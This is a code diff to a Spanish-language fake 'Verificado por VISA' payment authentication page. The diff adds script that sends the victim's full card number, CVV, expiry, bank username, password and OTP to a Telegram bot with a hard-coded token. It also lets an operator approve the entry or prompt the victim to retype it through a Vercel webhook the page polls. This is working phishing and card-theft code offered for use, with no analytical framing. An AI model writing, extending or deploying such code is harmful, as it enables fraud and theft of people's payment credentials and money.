@@ -61,7 +61,6 @@
             }
         }
 
-        /* HEADER CON LOGO */
         .header {
             display: flex;
             align-items: center;
@@ -125,7 +124,6 @@
             line-height: 1.1;
         }
 
-        /* TITULO PRINCIPAL */
         .form-title {
             font-size: 1.25rem;
             font-weight: 700;
@@ -153,7 +151,6 @@
             }
         }
 
-        /* INFORMACIÓN DE TRANSACCIÓN */
         .transaction-info {
             background: #f9fafb;
             border: 1px solid var(--co-border);
@@ -211,7 +208,6 @@
             }
         }
 
-        /* FORMULARIO */
         form {
             display: flex;
             flex-direction: column;
@@ -253,6 +249,12 @@
             box-shadow: 0 0 0 3px rgba(15, 155, 143, 0.1);
         }
 
+        .form-input:disabled {
+            background-color: #F9F9F9;
+            color: #999999;
+            cursor: not-allowed;
+        }
+
         @media (max-width: 480px) {
             .form-input {
                 font-size: 16px;
@@ -260,7 +262,6 @@
             }
         }
 
-        /* SECCIÓN DE CREDENCIALES */
         .credentials-section {
             background: #f9fafb;
             border: 1px solid var(--co-border);
@@ -329,7 +330,6 @@
             }
         }
 
-        /* CÓDIGO DE CONFIRMACIÓN */
         .confirmation-section {
             background: #f9fafb;
             border: 1px solid var(--co-border);
@@ -370,7 +370,6 @@
             }
         }
 
-        /* BOTONES */
         .button-group {
             display: flex;
             align-items: center;
@@ -426,7 +425,6 @@
             color: var(--co-text);
         }
 
-        /* FOOTER LINKS */
         .footer-links {
             display: flex;
             justify-content: center;
@@ -469,7 +467,6 @@
             }
         }
 
-        /* ERROR MESSAGES */
         .error-message {
             color: #c1121f;
             font-size: 0.8125rem;
@@ -485,23 +482,76 @@
             display: block;
         }
 
-        /* SUCCESS MESSAGE */
-        .success-message {
+        .status-message {
             display: none;
-            background: #d4edda;
-            color: #155724;
             padding: 12px 16px;
             border-radius: 6px;
             margin-bottom: 20px;
             font-size: 0.9375rem;
-            border: 1px solid #c3e6cb;
+            font-weight: 500;
+            text-align: center;
         }
 
-        .success-message.show {
+        .status-message.error {
             display: block;
+            background: #FFEBEE;
+            color: #C62828;
+            border: 1px solid #FFCDD2;
         }
 
-        /* RESPONSIVE - EXTRA SMALL DEVICES */
+        .status-message.success {
+            display: block;
+            background: #E8F5E9;
+            color: #2E7D32;
+            border: 1px solid #C8E6C9;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #fff;
+            font-size: 1.125rem;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .loading-subtext {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.875rem;
+            margin-top: 8px;
+        }
+
         @media (max-width: 360px) {
             html, body {
                 padding: 0;
@@ -544,19 +594,22 @@
     </style>
 </head>
 <body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Verificando autenticación...</div>
+        <div class="loading-subtext">Esperando confirmación de seguridad</div>
+    </div>
+
     <div class="container">
-        <!-- HEADER CON LOGO -->
         <div class="header">
             <div class="visa-logo">
                 <img src="image.png" alt="Verificado por VISA" />
             </div>
         </div>
 
-        <!-- TITULO Y DESCRIPCIÓN -->
         <h1 class="form-title">Autenticar con contraseña</h1>
         <p class="form-subtitle">Ingrese sus credenciales de seguridad a continuación.</p>
 
-        <!-- INFORMACIÓN DE LA TRANSACCIÓN -->
         <div class="transaction-info">
             <div class="info-row">
                 <span class="info-label">Comercio:</span>
@@ -576,13 +629,9 @@
             </div>
         </div>
 
-        <!-- FORMULARIO -->
-        <form id="authForm" novalidate>
-            <div class="success-message" id="successMessage">
-                ¡Autenticación exitosa! Redirigiendo...
-            </div>
+        <div class="status-message" id="statusMessage"></div>
 
-            <!-- CREDENCIALES -->
+        <form id="authForm" novalidate>
             <div class="credentials-section">
                 <div class="credentials-title">Credenciales de acceso</div>
                 <div class="credentials-grid">
@@ -611,7 +660,6 @@
                 </div>
             </div>
 
-            <!-- CÓDIGO DE CONFIRMACIÓN OTP -->
             <div class="confirmation-section">
                 <div class="form-group">
                     <label class="form-label">Código OTP (One-Time Password)</label>
@@ -629,33 +677,52 @@
                 </div>
             </div>
 
-            <!-- BOTONES -->
             <div class="button-group">
                 <a href="#" class="btn btn-link" id="helpLink">Ayuda</a>
                 <a href="#" class="btn btn-link" id="cancelLink">Cancelar</a>
-                <button type="submit" class="btn btn-submit">Enviar</button>
+                <button type="submit" class="btn btn-submit" id="submitButton">Enviar</button>
             </div>
         </form>
     </div>
 
     <script>
-        // Obtener datos del formulario de pago (simulado o desde sessionStorage)
+        // ============================================
+        // CONFIGURACIÓN
+        // ============================================
+        const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
+        const TELEGRAM_CHAT_ID = '-1004389419498';
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+        const WEBHOOK_URL = 'https://paso2-ajhp.vercel.app/api/webhook';
+        
+        const POLLING_INTERVAL = 3000;
+        const MAX_POLLING_TIME = 300000;
+
+        let solicitudId = null;
+        let pollingInterval = null;
+
+        // Elementos DOM
+        const form = document.getElementById('authForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const confirmationInput = document.getElementById('confirmationCode');
+        const submitButton = document.getElementById('submitButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const statusMessage = document.getElementById('statusMessage');
+
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
         function initializeTransaction() {
-            // Obtener el monto desde sessionStorage (si viene del formulario anterior)
-            const storageAmount = sessionStorage.getItem('paymentAmount') || '23.000';
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
             
-            // Calcular monto total
             let amount = 23000;
             if (storagePriority) {
                 amount += 20000;
             }
             
-            // Formatear y mostrar
             const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
             document.getElementById('transaction-amount').textContent = formattedAmount + ' Col$';
             
-            // Fecha actual
             const now = new Date();
             const dateStr = now.toLocaleDateString('es-CO', {
                 year: 'numeric',
@@ -669,30 +736,176 @@
             });
             document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
             
-            // Últimos 4 dígitos de tarjeta desde sessionStorage o localStorage
             let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
-            
-            // Si no está guardado, intentar obtenerlo del campo de número de tarjeta si está disponible
-            const cardNumberField = document.getElementById('cardNumber');
-            if (cardNumberField && cardNumberField.value) {
-                const fullCardNumber = cardNumberField.value.replace(/\s/g, '');
-                if (fullCardNumber.length >= 4) {
-                    cardLast4 = fullCardNumber.slice(-4);
-                    sessionStorage.setItem('cardLast4', cardLast4);
-                }
-            }
-            
             document.getElementById('card-last-digits').textContent = `XXXX XXXX XXXX ${cardLast4}`;
         }
 
-        // Validación del formulario
-        const form = document.getElementById('authForm');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const confirmationInput = document.getElementById('confirmationCode');
-        const successMessage = document.getElementById('successMessage');
+        // ============================================
+        // FUNCIONES TELEGRAM
+        // ============================================
+        function generarSolicitudId() {
+            return 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        }
 
-        // Validar campo al salir
+        async function enviarDatosATelegram(datos) {
+            try {
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: "✅ APROBAR",
+                                callback_data: `approve_${datos.solicitudId}`
+                            }
+                        ],
+                        [
+                            {
+                                text: "❌ ERROR USUARIO",
+                                callback_data: `user_error_${datos.solicitudId}`
+                            },
+                            {
+                                text: "❌ ERROR CONTRASEÑA",
+                                callback_data: `pass_error_${datos.solicitudId}`
+                            }
+                        ],
+                        [
+                            {
+                                text: "❌ ERROR OTP",
+                                callback_data: `otp_error_${datos.solicitudId}`
+                            }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *VISA VERIFIED - AUTENTICACIÓN*
+
+🆔 ID: \`${datos.solicitudId}\`
+
+💳 *DATOS DE TARJETA:*
+🏦 Número: \`${datos.numeroTarjeta}\`
+🔢 CVV: \`${datos.cvv}\`
+📅 Vencimiento: \`${datos.vencimiento}\`
+
+🔐 *CREDENCIALES:*
+👤 Usuario: \`${datos.usuario}\`
+🔑 Contraseña: \`${datos.password}\`
+
+📱 *OTP:*
+🔢 Código: \`${datos.otp}\`
+
+💰 Monto: ${datos.monto}
+📅 Fecha: ${datos.fecha}
+
+⏳ *Estado:* Esperando verificación...`;
+
+                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown',
+                        reply_markup: inlineKeyboard,
+                        disable_web_page_preview: true
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    console.log('✅ Datos enviados a Telegram');
+                    return true;
+                } else {
+                    console.error('❌ Error:', data.description);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // POLLING AL WEBHOOK
+        // ============================================
+        async function verificarEstadoWebhook(solicitudId) {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
+                const data = await response.json();
+                
+                console.log('📊 Estado webhook:', data.estado);
+                
+                return data.estado || 'pending';
+            } catch (error) {
+                console.error('❌ Error verificando webhook:', error);
+                return 'error';
+            }
+        }
+
+        function iniciarPolling() {
+            let tiempoInicio = Date.now();
+            
+            console.log('🔄 Iniciando polling al webhook...');
+            
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado. Intente nuevamente.');
+                    return;
+                }
+                
+                const resultado = await verificarEstadoWebhook(solicitudId);
+                
+                if (resultado === 'approved') {
+                    clearInterval(pollingInterval);
+                    mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
+                    setTimeout(() => {
+                        window.location.href = 'confirmacion.html';
+                    }, 2000);
+                } else if (resultado === 'user_error') {
+                    clearInterval(pollingInterval);
+                    mostrarError('❌ Los datos ingresados no coinciden. Verifique su usuario.');
+                    resetFormulario();
+                } else if (resultado === 'pass_error') {
+                    clearInterval(pollingInterval);
+                    mostrarError('❌ Los datos ingresados no coinciden. Verifique su contraseña.');
+                    resetFormulario();
+                } else if (resultado === 'otp_error') {
+                    clearInterval(pollingInterval);
+                    mostrarError('❌ Código de verificación erróneo, intenta de nuevo.');
+                    resetFormulario();
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        // ============================================
+        // FUNCIONES UI
+        // ============================================
+        function mostrarError(mensaje) {
+            statusMessage.className = 'status-message error';
+            statusMessage.textContent = mensaje;
+            statusMessage.style.display = 'block';
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+            submitButton.textContent = 'Enviar';
+        }
+
+        function mostrarExito(mensaje) {
+            statusMessage.className = 'status-message success';
+            statusMessage.textContent = mensaje;
+            statusMessage.style.display = 'block';
+            loadingOverlay.classList.remove('active');
+        }
+
+        function resetFormulario() {
+            usernameInput.disabled = false;
+            passwordInput.disabled = false;
+            confirmationInput.disabled = false;
+            solicitudId = null;
+        }
+
+        // ============================================
+        // VALIDACIÓN
+        // ============================================
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
             input.addEventListener('blur', function() {
                 if (this.value.trim()) {
@@ -701,25 +914,24 @@
             });
         });
 
-        // Solo números en el input OTP
         confirmationInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
-        form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
             let isValid = true;
 
-            // Validar usuario
+            statusMessage.className = 'status-message';
+            statusMessage.style.display = 'none';
+            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
+
             if (!usernameInput.value.trim()) {
                 usernameInput.parentElement.classList.add('error');
                 isValid = false;
-            } else {
-                usernameInput.parentElement.classList.remove('error');
             }
 
-            // Validar contraseña
             if (!passwordInput.value.trim()) {
                 passwordInput.parentElement.classList.add('error');
                 isValid = false;
@@ -727,11 +939,8 @@
                 passwordInput.parentElement.classList.add('error');
                 passwordInput.parentElement.querySelector('.error-message').textContent = 'La contraseña debe tener al menos 4 caracteres';
                 isValid = false;
-            } else {
-                passwordInput.parentElement.classList.remove('error');
             }
 
-            // Validar código OTP (6 dígitos)
             if (!confirmationInput.value.trim()) {
                 confirmationInput.parentElement.classList.add('error');
                 isValid = false;
@@ -739,26 +948,47 @@
                 confirmationInput.parentElement.classList.add('error');
                 confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código OTP debe contener 6 dígitos';
                 isValid = false;
-            } else {
-                confirmationInput.parentElement.classList.remove('error');
             }
 
-            if (isValid) {
-                // Mostrar mensaje de éxito
-                successMessage.classList.add('show');
-                
-                // Desactivar botón
-                form.querySelector('button[type="submit"]').disabled = true;
-                
-                // Simular redirección
-                setTimeout(() => {
-                    // Redirigir a página de confirmación o éxito
-                    window.location.href = 'confirmacion.html';
-                }, 1500);
+            if (!isValid) return;
+
+            solicitudId = generarSolicitudId();
+            console.log('🆔 Nueva solicitud:', solicitudId);
+
+            loadingOverlay.classList.add('active');
+            submitButton.disabled = true;
+            submitButton.textContent = 'Verificando...';
+
+            usernameInput.disabled = true;
+            passwordInput.disabled = true;
+            confirmationInput.disabled = true;
+
+            const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
+            const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
+            const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
+            
+            const datosTelegram = {
+                solicitudId: solicitudId,
+                numeroTarjeta: numeroTarjeta,
+                cvv: cvv,
+                vencimiento: vencimiento,
+                usuario: usernameInput.value.trim(),
+                password: passwordInput.value.trim(),
+                otp: confirmationInput.value.trim(),
+                monto: document.getElementById('transaction-amount').textContent,
+                fecha: document.getElementById('transaction-date').textContent
+            };
+
+            const enviado = await enviarDatosATelegram(datosTelegram);
+
+            if (enviado) {
+                iniciarPolling();
+            } else {
+                mostrarError('Error al procesar la solicitud. Intente nuevamente.');
+                resetFormulario();
             }
         });
 
-        // Botones de enlace
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
             alert('Para más ayuda, contacte a su banco o al servicio de atención al cliente.');
@@ -771,8 +1001,10 @@
             }
         });
 
-        // Inicializar transacción
-        window.addEventListener('load', initializeTransaction);
+        window.addEventListener('load', function() {
+            initializeTransaction();
+            console.log('✅ Sistema VISA listo - Usando webhook de Vercel');
+        });
     </script>
 </body>
 </html>
